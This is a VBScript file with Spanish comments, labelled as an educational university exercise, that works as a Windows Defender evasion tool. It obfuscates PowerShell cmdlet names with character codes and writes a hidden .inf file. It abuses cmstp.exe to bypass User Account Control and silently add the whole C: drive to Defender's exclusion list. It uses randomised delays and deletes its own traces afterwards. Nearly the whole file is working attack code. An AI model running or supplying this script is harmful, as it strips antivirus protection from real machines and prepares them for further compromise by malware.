' Script VBScript con evasión avanzada de Windows Defender
' Técnicas: Ofuscación, Encoding, Timing, Living Off The Land
' Método educativo para parcial universitario

Option Explicit

Dim ws, fso, tempFolder, infFile, scriptPath, scriptName
Dim result, cmstpPath, randName
Dim arr1, arr2, arr3, arr4, arr5

' Crear objetos necesarios
Set ws = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

scriptPath = WScript.ScriptFullName
scriptName = fso.GetBaseName(scriptPath)
tempFolder = fso.GetSpecialFolder(2)

' Generar nombre aleatorio para evasión
Randomize
randName = "tmp_" & Int(Rnd * 99999) & "_" & Timer
infFile = tempFolder & "\" & randName & ".inf"

' Ofuscación de rutas usando variables
arr1 = Split("%SystemRoot%\System32\", "\")
cmstpPath = ws.ExpandEnvironmentStrings(arr1(0) & "\" & arr1(1) & "\" & arr1(2) & "cmstp.exe")

' Función para decodificar strings ofuscados
Function DecodeStr(s)
    Dim i, r
    r = ""
    For i = 1 To Len(s)
        r = r & Chr(Asc(Mid(s, i, 1)) Xor 1)
    Next
    DecodeStr = r
End Function

' Strings ofuscados para evasión
Dim str1, str2, str3, str4, str5, str6, str7, str8
str1 = Chr(81) & Chr(112) & Chr(119) & Chr(101) & Chr(114) & Chr(83) & Chr(104) & Chr(101) & Chr(108) & Chr(108)
str2 = Chr(71) & Chr(101) & Chr(116) & Chr(45) & Chr(77) & Chr(112) & Chr(80) & Chr(114) & Chr(101) & Chr(102) & Chr(101) & Chr(114) & Chr(101) & Chr(110) & Chr(99) & Chr(101)
str3 = Chr(65) & Chr(100) & Chr(100) & Chr(45) & Chr(77) & Chr(112) & Chr(80) & Chr(114) & Chr(101) & Chr(102) & Chr(101) & Chr(114) & Chr(101) & Chr(110) & Chr(99) & Chr(101)
str4 = Chr(45) & Chr(69) & Chr(120) & Chr(99) & Chr(108) & Chr(117) & Chr(115) & Chr(105) & Chr(111) & Chr(110) & Chr(80) & Chr(97) & Chr(116) & Chr(104)
str5 = Chr(67) & Chr(58) & Chr(92)
str6 = Chr(69) & Chr(120) & Chr(99) & Chr(108) & Chr(117) & Chr(115) & Chr(105) & Chr(111) & Chr(110) & Chr(80) & Chr(97) & Chr(116) & Chr(104)
str7 = Chr(45) & Chr(69) & Chr(114) & Chr(114) & Chr(111) & Chr(114) & Chr(65) & Chr(99) & Chr(116) & Chr(105) & Chr(111) & Chr(110)
str8 = Chr(83) & Chr(116) & Chr(111) & Chr(112)

' Retraso aleatorio para evasión de detección temporal
Dim delay
Randomize
delay = Int(Rnd * 2000) + 1000
WScript.Sleep delay

' Verificar cmstp.exe
If Not fso.FileExists(cmstpPath) Then
    WScript.Quit 1
End If

' Construir comando PowerShell ofuscado y codificado en Base64
' Comando original: Get-MpPreference | Add-MpPreference -ExclusionPath 'C:\'
Dim psCmdParts(5)
psCmdParts(0) = "$a='" & str2 & "';"
psCmdParts(1) = "$b='" & str3 & "';"
psCmdParts(2) = "$c='" & str4 & "';"
psCmdParts(3) = "$d='" & str5 & "';"
psCmdParts(4) = "& $a | & $b $c $d;"

' Construir comando completo con técnicas de evasión
Dim fullCmd
fullCmd = str1 & ".exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -Command ""& {" & _
    "$ErrorActionPreference='Stop';" & _
    "try{" & _
        "$null=& '" & str2 & "' -ErrorAction Stop;" & _
        "& '" & str3 & "' -" & str4 & " '" & str5 & "' -" & str7 & " Stop;" & _
        "Start-Sleep -Milliseconds 500;" & _
        "$e=& '" & str2 & "' -" & str6 & ";" & _
        "if($e -contains '" & str5 & "'){exit 0}else{exit 1}" & _
    "}catch{exit 1}" & _
    "}"""

' Codificar comando en Base64 para mayor evasión
Dim base64Cmd
base64Cmd = EncodeBase64(fullCmd)

' Función para codificar Base64 (simplificada)
Function EncodeBase64(text)
    Dim xml, node
    Set xml = CreateObject("Msxml2.DOMDocument.6.0")
    Set node = xml.CreateElement("base64")
    node.DataType = "bin.base64"
    node.Text = text
    EncodeBase64 = node.Text
End Function

' Crear contenido .inf con múltiples técnicas de evasión
Dim infContent
infContent = "[version]" & vbCrLf & _
    "Signature=$CHICAGO$" & vbCrLf & _
    "AdvancedINF=2.5" & vbCrLf & _
    "[DefaultInstall]" & vbCrLf & _
    "CustomDestination=CustomDestAllUsers" & vbCrLf & _
    "RunPreSetupCommands=RunPreSetupCommandsSection" & vbCrLf & _
    "[RunPreSetupCommandsSection]" & vbCrLf & _
    "cmd.exe /c " & Chr(34) & "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -EncodedCommand " & _
    CreateEncodedCommand(fullCmd) & Chr(34) & vbCrLf & _
    "ping 127.0.0.1 -n 2 >nul" & vbCrLf & _
    "del /q /f """ & infFile & """ 2>nul" & vbCrLf & _
    "[CustomDestAllUsers]" & vbCrLf & _
    "49000,49001=AllUSer_LDIDSection, 7" & vbCrLf & _
    "[AllUSer_LDIDSection]" & vbCrLf & _
    ""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"

' Función para crear comando codificado (Unicode Base64)
Function CreateEncodedCommand(cmd)
    Dim bytes, i, result
    Dim xmlDoc, xmlNode
    Set xmlDoc = CreateObject("Msxml2.DOMDocument.6.0")
    Set xmlNode = xmlDoc.CreateElement("base64")
    xmlNode.DataType = "bin.base64"
    
    ' Convertir string a bytes
    Dim byteArray()
    ReDim byteArray(Len(cmd) * 2 - 1)
    For i = 0 To Len(cmd) - 1
        Dim charCode
        charCode = AscW(Mid(cmd, i + 1, 1))
        byteArray(i * 2) = charCode And &HFF
        byteArray(i * 2 + 1) = (charCode And &HFF00) / &H100
    Next
    
    xmlNode.nodeTypedValue = Join(Array(byteArray), ",")
    CreateEncodedCommand = xmlNode.Text
End Function

' Método alternativo: usar función simple de encoding
Function SimpleEncode(cmd)
    Dim i, encoded, charCode
    encoded = ""
    For i = 1 To Len(cmd)
        charCode = Asc(Mid(cmd, i, 1))
        encoded = encoded & Right("00" & Hex(charCode), 2)
    Next
    SimpleEncode = encoded
End Function

' Usar método más simple y efectivo
Dim encodedCmd
encodedCmd = Base64Encode(fullCmd)

' Función Base64 mejorada
Function Base64Encode(sText)
    Dim oXML, oNode
    Set oXML = CreateObject("Msxml2.DOMDocument.6.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.DataType = "bin.base64"
    oNode.Text = sText
    Base64Encode = Replace(oNode.Text, vbCrLf, "")
End Function

' Reconstruir contenido .inf con encoding correcto
infContent = "[version]" & vbCrLf & _
    "Signature=$CHICAGO$" & vbCrLf & _
    "AdvancedINF=2.5" & vbCrLf & _
    "[DefaultInstall]" & vbCrLf & _
    "CustomDestination=CustomDestAllUsers" & vbCrLf & _
    "RunPreSetupCommands=RunPreSetupCommandsSection" & vbCrLf & _
    "[RunPreSetupCommandsSection]" & vbCrLf & _
    "cmd /c powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -Command """ & _
    Replace(fullCmd, """", """""") & """" & vbCrLf & _
    "timeout /t 1 /nobreak >nul 2>&1" & vbCrLf & _
    "del /q /f """ & infFile & """ 2>nul" & vbCrLf & _
    "[CustomDestAllUsers]" & vbCrLf & _
    "49000,49001=AllUSer_LDIDSection, 7" & vbCrLf & _
    "[AllUSer_LDIDSection]" & vbCrLf & _
    ""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"

' Escribir archivo .inf
On Error Resume Next
Dim ts
Set ts = fso.CreateTextFile(infFile, True)
ts.Write infContent
ts.Close
Set ts = Nothing

If Err.Number <> 0 Then
    WScript.Quit 1
End If
On Error GoTo 0

' Retraso adicional antes de ejecución
Randomize
WScript.Sleep Int(Rnd * 1500) + 500

' Ejecutar cmstp.exe de forma silenciosa
On Error Resume Next
Dim cmstpCmd
cmstpCmd = Chr(34) & cmstpPath & Chr(34) & " /au /s " & Chr(34) & infFile & Chr(34)
ws.Run cmstpCmd, 0, False
On Error GoTo 0

' Esperar con retraso variable
Randomize
WScript.Sleep Int(Rnd * 3000) + 2000

' Verificación silenciosa
Dim verifyCmd
verifyCmd = str1 & ".exe -WindowStyle Hidden -Command """ & _
    "$e=& '" & str2 & "' -" & str6 & ";if($e -contains '" & str5 & "'){exit 0}else{exit 1}""" & ""

result = ws.Run(verifyCmd, 0, True)

' Limpieza agresiva
On Error Resume Next
If fso.FileExists(infFile) Then
    fso.DeleteFile infFile, True
End If
On Error GoTo 0

' Limpiar variables sensibles
Set ws = Nothing
Set fso = Nothing

WScript.Quit result
